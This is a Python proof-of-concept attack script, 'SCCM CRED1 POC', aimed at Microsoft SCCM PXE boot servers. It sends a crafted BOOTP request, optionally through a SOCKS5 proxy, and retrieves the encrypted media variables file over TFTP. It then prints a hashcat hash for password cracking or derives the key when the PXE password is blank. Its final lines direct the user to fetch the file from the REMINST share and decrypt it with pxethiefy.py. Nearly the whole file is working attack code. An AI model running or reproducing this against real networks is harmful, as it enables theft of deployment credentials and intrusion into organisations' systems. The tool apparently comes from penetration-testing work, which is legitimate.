from lib import sccm
from lib import socks, tftp
import argparse

# Parse arguments
parser = argparse.ArgumentParser(description="SCCM CRED1 POC")
parser.add_argument("target", help="SCCM PXE IP")
parser.add_argument("src_ip", help="Source IP")
parser.add_argument("--socks-host", help="SOCKS5 proxy host (omit for direct UDP)")
parser.add_argument("--socks-port", help="SOCKS5 proxy port", type=int)
parser.add_argument("--timeout", help="UDP receive timeout in seconds (default: 5)", type=int, default=5)
args = parser.parse_args()

def make_client():
    if args.socks_host and args.socks_port:
        client = socks.SOCKS5Client(args.socks_host, args.socks_port, timeout=args.timeout)
    else:
        client = socks.DirectUDPClient(timeout=args.timeout)
    client.connect()
    return client

client = make_client()

sccm_client = sccm.SCCM(args.target, 4011, client)
(variables,bcd,cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")

print(f"[*] Variables file: {variables}")
print(f"[*] BCD file: {bcd}")

client.close()

# TFTP Limitation over SOCKS5 means we can only grab the first few bytes (we can't ack the request):()
client = make_client()

tftp_client = tftp.TFTPClient(args.target, 69, client)
data_variables = tftp_client.get_file(variables)

if cryptokey == None:
    hashcat_hash = f"$sccm$aes128${sccm_client.read_media_variable_file_header(data_variables).hex()}"
    print(hashcat_hash)
    print("[*] Try cracking this hash to read the media file")
else:
    print("[*] Blank password on PXE media file found!")
    print("[*] Attempting to decrypt it...")
    decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
    if( decrypt_password ):
        print("[*] Password retrieved: " + decrypt_password.hex())
        
print("[*] Once you have the key, download the variables file from:")
print(f"[*] \\\\{args.target}\\REMINST{variables}")
print("[*] You can then decrypt this with PXEThiefy.py using:")
print("[*] python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")